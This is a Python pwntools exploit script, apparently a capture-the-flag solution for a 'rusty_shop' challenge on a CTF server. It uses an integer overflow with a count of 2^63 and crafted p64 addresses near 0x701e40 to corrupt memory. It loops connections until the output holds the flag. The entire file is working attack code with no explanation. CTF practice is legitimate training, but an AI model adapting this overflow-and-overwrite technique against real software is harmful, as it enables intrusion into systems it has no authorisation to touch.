#!/usr/bin/env python
from pwn import *


#y = process( './rusty_shop' )
#y = remote( 'challenges.fbctf.com' , 1342 )
#pause()

def cre( name , desc , price ):
    y.sendlineafter( '6. Check out' , '1' )
    y.sendlineafter( ':' , name )
    y.sendlineafter( ':' , desc )
    y.sendlineafter( ':' , str( price ) )


def add( idx , count ):
    y.sendlineafter( '6. Check out' , '4' )
    y.sendlineafter( ':' , str( idx ) )
    y.sendlineafter( ':' , str( count ) )

def check_out():
    y.sendlineafter( '6. Check out' , '6' )


while True:
    y = remote( 'challenges.fbctf.com' , 1342 )

    try:
        #cre( p64( 0x701e40 - 0x18 ) , p64( 0x701e40 - 0x18 ) , 0x701e40 )
        #add( 1 , 9223372036854775808 )
        #check_out()

        cre( p64( 0x701e40 ) , p64( 0x700020 ) , 0x700020 )
        cre( p64( 0x701e40 - 0x18 ) , p64( 0x700000 ) , 0x700000 )

        add( 1 , 9223372036854775808 )

        check_out()

        o = y.recvall()
        print o
        if 'fb' in o:
            break
        y.close()
    except:
        o = y.recvall()
        print o
        y.close()

    #y.interactive()
